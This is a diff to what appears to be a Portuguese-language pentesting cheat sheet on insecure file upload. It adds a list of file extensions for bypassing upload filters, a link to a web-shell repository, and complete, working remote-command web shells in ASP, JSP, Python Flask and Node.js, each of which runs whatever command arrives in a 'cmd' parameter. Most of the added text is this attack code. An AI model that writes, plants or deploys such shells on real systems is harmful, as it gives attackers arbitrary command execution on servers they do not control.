@@ -1,3 +1,14 @@
+## Extensões para bypass
+```
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .phar
+
+ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+
+JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+```
+## Web Shell Files 
+github.com/tennc/webshell
+
 ## PHP Simple Web Shell
 ```
 <?php
@@ -6,6 +17,77 @@
     }
 ?>
 ```
+## ASP Simple Web Shell
+```
+<% 
+If Request.QueryString("cmd") <> "" Then 
+    Set objShell = Server.CreateObject("WScript.Shell") 
+    Set objExec = objShell.Exec(Request.QueryString("cmd")) 
+    Set objOutput = objExec.StdOut 
+    Response.Write("<pre>" & objOutput.ReadAll() & "</pre>") 
+End If 
+%>
+```
+## JSP Simple Web Shell
+```
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    String s = "";
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    while ((s = sI.readLine()) != null) {
+        out.println(s);
+    }
+}
+%>
+```
+## Python Simple Web Shell
+```
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/shell', methods=['GET'])
+def shell():
+    cmd = request.args.get('cmd')
+    if cmd:
+        output = os.popen(cmd).read()
+        return f"<pre>{output}</pre>"
+    return "<pre>No command provided</pre>"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+```
+## Node.js Simple Web Shell
+```
+const express = require('express');
+const { exec } = require('child_process');
+
+const app = express();
+
+app.get('/shell', (req, res) => {
+  const cmd = req.query.cmd;
+  if (cmd) {
+    exec(cmd, (error, stdout, stderr) => {
+      if (error) {
+        res.send(`<pre>${stderr}</pre>`);
+        return;
+      }
+      res.send(`<pre>${stdout}</pre>`);
+    });
+  } else {
+    res.send('<pre>No command provided</pre>');
+  }
+});
+
+app.listen(8080, '0.0.0.0', () => {
+  console.log('Web shell running on port 8080');
+});
+```
+
 
 ## Comandos Linux para Upload Inseguro
 | Command  | Description                                                                 |
